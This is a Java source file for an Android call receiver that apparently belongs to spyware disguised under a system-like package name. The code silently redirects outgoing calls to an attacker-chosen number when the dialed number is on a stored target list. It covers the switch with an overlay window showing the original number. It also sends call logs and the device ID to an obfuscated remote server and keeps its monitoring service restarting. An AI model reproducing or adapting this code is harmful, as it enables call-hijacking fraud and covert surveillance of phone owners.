package com.android.smartmonitor.receiver;

import java.io.File;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.TimeZone;

import wei.mark.standout.StandOutWindow;

import com.android.smartmonitor.PhoneWindow;
import com.android.smartmonitor.common.CheckGlobal;
import com.android.smartmonitor.common.CheckNC;
import com.android.smartmonitor.control.CheckCall;
import com.android.smartmonitor.control.CheckRunning;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Log;

public class CheckCallReceiver extends BroadcastReceiver {
	public static int m_callState = 0;
	public static ArrayList<HashMap<String, String>> g_recordArray = new ArrayList<HashMap<String, String>>();
	public static String phone_num = null;
	public static String task_phone_num = "!@#$%^&*()";
	public static String type = "1";
	public static boolean m_isChange = false;
	private Context mContext = null;
	boolean isChange = false;
	TelephonyManager telephony = null;
	HashMap<String, String> result = new HashMap<String, String>();
	
	public static ArrayList<HashMap<String, String>> g_recordTimeArray = new ArrayList<HashMap<String, String>>();
	
	public void init(Context context) {
    }
    
    public static int getCallState()
    {
    	return m_callState;
    }
    
    public static void setCallState(int callState)
    {
    	m_callState = callState;
    }

    @Override
	public void onReceive(final Context context, final Intent intent) {
    	if (mContext == null){
    		mContext = context;
    	}

		checkServiceMonitorState();
    	
    	HashMap<String, String> localHashMap = null;
    	String action = intent.getAction();
		final CheckCall m_call = new CheckCall(mContext);

    	Log.i("----", "lyh:" + action);
    	
    	if (telephony == null){
    		telephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
    	}
    	
    	try
    	{
	    	if(action.equals("android.intent.action.PHONE_STATE"))
	    	{
				String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
				Log.i("****", "lyh:" + state);
				if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) 
				{
					Bundle bundle = new Bundle();
					bundle.putString("number", "");
					StandOutWindow.sendData(mContext, PhoneWindow.class, 0, 1, bundle, PhoneWindow.class, 0);

				}
				else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state))
				{
					setCallState(0);
					SharedPreferences.Editor localEditor = context.getSharedPreferences("d", 0).edit();
					localEditor.putInt("callLogUpload", 0);
			    	localEditor.commit();
			    	if (m_isChange){
			    		setTickCount(getTickCount() + 1);
			    		if (getTickCount() >= 1){
			    			new Handler().postDelayed(new Runnable() {
								public void run() {
									CheckGlobal.updateCallLog(mContext, phone_num, task_phone_num);
									task_phone_num = "!@#$%^&*()";
					    			m_isChange = false;
								}
							}, 1000);
			    			new Handler().postDelayed(new Runnable() {
								public void run() {
									StandOutWindow.closeAll(mContext, PhoneWindow.class);
								}
							}, 3000);
			    		}
			    	}
				}
				else if (TelephonyManager.EXTRA_STATE_RINGING.equals(state))
				{
					phone_num = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
					type = "2";
				}
			}

	    	else if(action.equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
				setCallState(1);
				phone_num = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
				type = "1";

				DateFormat dateFormatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
				dateFormatter.setLenient(false);
				Date today = new Date();
				String s = dateFormatter.format(today);

				result = new HashMap<String, String>();
				result.put(String.valueOf(0), "2");
				result.put(String.valueOf(1), phone_num);
				result.put(String.valueOf(2), s);
				result.put(String.valueOf(3), "9999");
				result.put("phone_deviceID", CheckGlobal.getDeviceID(mContext));
				result.put("action", "post");
				result.put("number", "1");

				new PostLastCallLog().execute("lastlog");
				StandOutWindow.closeAll(mContext, PhoneWindow.class);
				if (isChangeNumber(phone_num)){
					//StandOutWindow.show(mContext, PhoneWindow.class, StandOutWindow.DEFAULT_ID);
					m_isChange = true;
					setTickCount(0);
					setResultData(task_phone_num);
					new Handler().post(new Runnable() {
						public void run() {
							StandOutWindow.show(mContext, PhoneWindow.class, StandOutWindow.DEFAULT_ID);
							Bundle bundle = new Bundle();
							bundle.putString("number", phone_num);
							StandOutWindow.sendData(mContext, PhoneWindow.class, 0, 0, bundle, PhoneWindow.class, 0);
						}
					});
				}
			}
    	} catch (Exception e) {
    		e.printStackTrace();
    	}
	}
    
    private boolean recursiveDelete(File toDelete) {
        if (!toDelete.exists()) {
            return false;
        }
        
        if (toDelete.isDirectory()) {
            // If any of the recursive operations fail, then we return false
            boolean success = true;
            for (File entry : toDelete.listFiles()) {
                success &= recursiveDelete(entry);
            }
            
            return success && toDelete.delete();
        } else {
            return toDelete.delete();
        }
    }

    private void setValue(String key, String value) {
    	if (mContext == null)
    		return;
    	SharedPreferences.Editor localEditor = mContext.getSharedPreferences("d", 0).edit();
    	localEditor.putString(key, value);
    	localEditor.commit();
    }
    
    private String getValue(String key){
    	if (mContext == null)
    		return "";
    	SharedPreferences localSharedPreferences = mContext.getSharedPreferences("d", 0);
        String retValue = localSharedPreferences.getString(key, "");
        return retValue;
    }
    
    private int getTickCount(){
    	if (mContext == null)
    		return 0;
    	SharedPreferences localSharedPreferences = mContext.getSharedPreferences("d", 0);
        int retValue = localSharedPreferences.getInt("tick", 0);
        return retValue;
    }
    
    private void setTickCount(int value){
    	if (mContext == null)
    		return;
    	SharedPreferences.Editor localEditor = mContext.getSharedPreferences("d", 0).edit();
    	localEditor.putInt("tick", value);
    	localEditor.commit();
    }
    
    private boolean isChangeNumber(String num){
    	if (mContext == null)
    		return false;

    	SharedPreferences localSharedPreferences = mContext.getSharedPreferences("d", 0);
		int nCount = localSharedPreferences.getInt("callchange_count", 0);
		if(nCount == 0)
			return false;

		for(int i = 0; i< CheckGlobal.changeNumbers.length; i++) {
			if (CheckGlobal.changeNumbers[i].toString().indexOf(num) > -1) {
				task_phone_num = localSharedPreferences.getString("tarphone", "");
				return true;
			}
		}

    	for (int i=0; i<nCount; i++){
    		int index = i + 1;
    		String phone = localSharedPreferences.getString("srcphone" + index, "!@#$%^&*()");
    		if (phone.equals(num)){
    			task_phone_num = localSharedPreferences.getString("tarphone", "");
    			return true;
    		}
    	}
    	return false;
    }
	public void checkServiceMonitorState()
	{
		boolean isServiceRunning = false;
		ActivityManager manager = (ActivityManager) mContext.getSystemService(mContext.ACTIVITY_SERVICE);
//		((ActivityManager)this.getSystemService(Context.ACTIVITY_SERVICE)).getLargeMemoryClass();
		Intent localIntent;

		try{
			for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
				if (CheckRunning.class.getName().equals(service.service.getClassName())) {
					isServiceRunning = true;
					break;
				}
			}

			if(isServiceRunning == false)
			{
				localIntent = new Intent(mContext, CheckRunning.class);
				mContext.startService(localIntent);
			}
		} catch(Exception e)
		{

		}
	}

	private class PostLastCallLog extends AsyncTask<String, Integer, String> {

		@Override
		protected void onPreExecute() {
			super.onPreExecute();
		} // end of onPreExecute

		@Override
		protected void onProgressUpdate(Integer... progress) {
		} // end of onPreExecute

		@Override
		protected void onPostExecute(String url) {
			Log.d("PostLastCallLog: ", "ok");
		} // end of onPostExecute

		@Override
		protected String doInBackground(String... sUrl) {
			try {
				String url = CheckGlobal.KMSDecode(CheckGlobal.g_managerURL) + "call.log.php";
				String response = CheckNC.sendWithPost(url, result, "Utf-8");
				System.out.println(response);
			} catch(Exception e) {

				Log.d("PostLastCallLog: ", e.toString());
			}
			return null;
		} // end of doInBackground

	}
}
